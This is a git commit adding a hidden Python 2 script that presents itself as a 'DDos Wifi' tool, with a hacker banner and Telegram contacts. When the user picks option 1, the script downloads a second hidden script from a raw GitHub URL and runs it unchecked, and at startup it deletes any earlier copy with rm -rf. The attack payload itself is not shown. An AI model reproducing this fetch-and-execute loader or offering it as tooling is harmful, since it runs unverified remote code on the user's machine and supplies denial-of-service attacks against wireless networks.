06a78d286fdb5c56274e52fddfe7682ddf5d5029
hh119191955 <88662735+hh119191955@users.noreply.github.com>
2021-08-13 14:31:18 +0300

    Add files via upload

---
+++ .choicdddd.py
@@ -0,0 +1,51 @@
+import os
+import sys
+import wget
+
+
+os.system("rm -rf .dddd92.py")
+os.system("clear")
+
+print("""
+	
+d8888b. d8888b.  .d88b.  .d8888. 
+88  `8D 88  `8D .8P  Y8. 88'  YP 
+88   88 88   88 88    88 `8bo.   
+88   88 88   88 88    88   `Y8b. 
+88  .8D 88  .8D `8b  d8' db   8D 
+Y8888D' Y8888D'  `Y88P'  `8888Y' 
+                                 
+                                 
+
+\033[1;97m--------------------------------------------------	
+\033[1;97mAuther : Hama Z.w
+\033[1;97mTelegram Channel : @kurdhacker_hama_bn_dlaj
+\033[1;97mTelegram Group : @kurdhackerzw
+\033[1;97mGithub : https://github.com/533hacker
+\033[1;97mThis Tool DDos Wifi
+\033[1;97m--------------------------------------------------
+""")
+
+
+
+
+
+
+print '         1-DDos Wifi'
+print '\t 0-Exit '
+hama = raw_input("Halbzhera:")
+
+if hama == '393389':
+	os.system("clear")
+	
+	
+	
+elif hama == '1':
+	down = "https://raw.githubusercontent.com/hh119191955/299292827uee/main/.dddd92.py"
+	wget.download(down)
+	os.system("python2 .dddd92.py")
+	
+	
+	
+elif hama == '0':
+	sys.exit()
